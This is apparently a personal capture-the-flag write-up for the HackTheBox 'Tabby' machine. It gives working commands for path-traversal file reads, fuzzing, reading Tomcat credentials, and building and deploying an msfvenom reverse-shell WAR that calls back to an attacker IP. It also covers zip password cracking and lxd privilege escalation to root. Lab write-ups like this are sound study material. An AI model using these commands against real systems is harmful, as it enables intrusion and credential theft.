#box #path-traversal #tomcat #WAR-upload #manager-script #lxd
1. The machine exposes a website on port 80 and a tomcat instance on port 8080
2. After a quick look at port 80 we discover a query param named `file` pointing at `http://megahosting.htb/news.php?file=statement`. After trying to reference `/etc/passwd` we realize the application is vulnerable to LFI
![[attachments/tabby-2.png]]
![[attachments/tabby-1.png]]
3. We know that on port 8080 there's an instance running tomcat. We opt to use a specific list with LFI to enumerate for potential configuration files inside of tomcat. In this particular case we aim to find `tomcat-users.xml` which usually contains the users credential to access tomcat manager. We discover the following list: https://packages.debian.org/bullseye/all/tomcat9/filelist and proceed to fuzz it
```sh
ffuf -w list -u http://megahosting.htb/news.php?file=../../../../FUZZ -c -ic -fs 0
```
![[attachments/tabby-3.png]]
4. After discovering the location of the `tomcat-users.xml` file we proceed to get it and we discover the credentials to access the host manager being `tomcat:$3cureP4s5w0rd123!`
```sh
curl http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
```
5. We access to tomcat and we then discover (had to look at the walkthrough) that even without the `manager-gui` claim, we still can upload a WAR file. (in this case we only are `admin-gui` and `manager-script`) following this guide (it refers to the same box actually) https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00. So, we first craft the payload:
```sh
msfvenom -p java/shell_reverse_tcp lhost=10.10.14.194 lport=8080 -f war -o pwn.war
```
and then upload it
```sh
curl -v -u tomcat:'$3cureP4s5w0rd123!' --upload-file pwn.war 'http://megahosting.htb:8080/manager/text/deploy?path=/foo&update=true'
```
5. Now, with a listener running we can point at `http://megahosting.htb:8080/foo` (foo is name of the module uploaded) and receive a shell on our end.
6. Landed on the machine as `tomcat` we discover in `/var/www/html/files` a file named `16162020_backup.zip`. After moving it on our machine we proceed to crack it with `john`
```sh
zip2john 16162020_backup.zip > zip2john
john --format=zip --wordlist=/usr/share/wordlists/rockyou.txt zip2john
```
7. After cracking it, we discover a new pair of credentials that can be used to authenticate as `ash:admin@it`
8. We discover `ash` belongs to the group `lxd` which is vulnerable to a LPE vector involving the creation of a privileged container, so we can leverage the following priv esc vector to gain a root session: https://medium.com/@poornima__164/from-user-to-root-exploiting-lxd-for-privilege-escalation-84946dd32f0b
9. We then first download the repository indicated in the post at https://github.com/saghul/lxd-alpine-builder, then we build it with `sudo ./build-alpine`. 
   Once the build script has finished it'll have generated a `.tar.gz` file. 
   At this point we can transfer that on the target machine (on the `home` folder of the user since inside `tmp` it w';asn't working!).
   Finally, we copy the script shown here https://www.exploit-db.com/exploits/46978 (and we update the references of `lxc` and `lxd` to be respectively `/snap/bin/lxd` and `snap/bin/lxc`) and finally we can execute the script obtaining a root session
```sh
./lxd.sh -f alpine-v3.23-x86_64-20260325_1856.tar.gz
```

![[attachments/tabby-4.png]]

>Since we are inside a container, the flag will then be located at `/mnt/root/root/root.txt` instead of `/root/root.txt`
>![[attachments/tabby-5.png]]

